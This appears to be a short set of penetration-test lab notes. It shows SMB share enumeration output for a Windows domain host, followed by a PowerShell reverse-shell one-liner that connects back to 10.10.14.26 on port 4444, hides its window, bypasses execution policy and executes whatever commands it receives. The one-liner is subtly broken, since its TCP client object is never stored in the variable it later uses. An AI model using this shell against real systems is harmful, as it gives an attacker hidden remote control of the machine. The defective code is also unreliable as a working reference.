[+] 10.10.10.193:445      - ADMIN$ - (DISK) Remote Admin
[+] 10.10.10.193:445      - C$ - (DISK) Default share
[+] 10.10.10.193:445      - HP-MFT01 - (PRINTER) HP-MFT01
[+] 10.10.10.193:445      - IPC$ - (IPC) Remote IPC
[+] 10.10.10.193:445      - NETLOGON - (DISK) Logon server share 
[+] 10.10.10.193:445      - print$ - (DISK) Printer Drivers
[+] 10.10.10.193:445      - SYSVOL - (DISK) Logon server share

powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.26",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()